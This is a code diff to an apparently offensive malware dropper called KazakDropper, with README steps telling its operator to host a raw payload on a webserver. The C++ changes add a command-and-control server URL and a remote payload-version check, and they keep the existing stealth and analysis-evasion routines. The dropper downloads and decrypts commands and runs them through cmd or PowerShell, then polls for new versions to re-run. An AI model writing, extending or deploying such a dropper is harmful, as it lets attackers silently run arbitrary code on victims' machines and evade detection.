@@ -3,6 +3,7 @@
 
 1. Put your payload inlined inside a text file on a webserver, be sure it works and u tested it.
 2. Edit the link to where the raw payload is stored.
+3. Create another text file that contains the payload version and put ur version link into the source code. To change the payload version u gotta first edit the payload then edit the version.
 3. In case of POWERSHELL payloads and not Command Prompt commands, be sure to put "powershell" in front of the payload.
 4. Enjoy.
 
@@ -115,6 +116,8 @@ void KazakDropper::PreparePayload()
 	Storage S;
 
 	S.PayloadLink = enc("RAW PAYLOAD LINK");
+	S.ServerURL = enc("YOUR C&C SERVER URL");
+
 	S.EncryptedPayload = KazakUtils::StringWrapper(S.PayloadLink);
 	S.XorKey = enc("Kazak");
 
@@ -138,24 +141,43 @@ void KazakDropper::DropPayload(std::string payload)
 	else
 		li(system)(PowerShellCommand.c_str());
 
+	S.ExecutedTimes++;
+
 }
 
 int main()
 {
 	Storage S;
 
-	while (!li(InternetCheckConnectionA)(enc("https://google.com"), FLAG_ICC_FORCE_CONNECTION, 0))
+	while (!li(InternetCheckConnectionA)(S.ServerURL.c_str(), FLAG_ICC_FORCE_CONNECTION, 0))
 		Sleep(1000);
 
 	KazakDropper::Stealth();
 
-	while (!KazakDropper::EvadeAnalysis())
+	while (!KazakDropper::EvadeAnalysis() && li(InternetCheckConnectionA)(S.ServerURL.c_str(), FLAG_ICC_FORCE_CONNECTION, 0))
 	{
 		KazakDropper::PreparePayload();
 		
 		KazakDropper::DropPayload(S.DecryptedPayload);
 
-		exit(-1);
+		if (S.ExecutedTimes > 0)
+		{
+			S.DecryptedPayload.clear();
+			S.EncryptedPayload.clear();
+
+			S.CmdPayload = false;
+			S.PowerShellPayload = false;
+		}
+
+		S.PayloadVersion = KazakUtils::StringWrapper(enc("HERE PUT UR TEXT FILE THAT HAS THE VERSION IN IT"));
+
+		if (S.PayloadVersion == enc("1"))
+		{
+			while (S.PayloadVersion == enc("1"))
+				Sleep(1000);
+		}
+		else if (S.PayloadVersion != enc("1"))
+			main();
 
 	}
 
